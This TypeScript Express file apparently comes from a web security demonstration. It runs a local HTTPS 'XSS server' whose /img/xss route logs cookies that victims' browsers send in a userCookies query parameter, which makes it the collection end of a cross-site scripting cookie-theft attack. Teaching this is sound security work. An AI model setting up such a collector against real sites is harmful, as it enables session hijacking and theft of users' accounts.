



import * as express from 'express';
import {Application} from "express";
import * as fs from 'fs';
import * as https from 'https';



const app: Application = express();

app.use(express.static('.'));


// REST API
app.route('/img/xss')
    .get((req, res) => {

        console.log("XSS Server Received User Cookies: " + req.query.userCookies);

        res.sendStatus(200);

    });




const httpsServer = https.createServer({
    key: fs.readFileSync('key.pem'),
    cert: fs.readFileSync('cert.pem')
}, app);

// launch an HTTPS Server. Note: this does NOT mean that the application is secure
httpsServer.listen(9090, () => console.log("XSS server running at https://localhost:" + httpsServer.address().port));

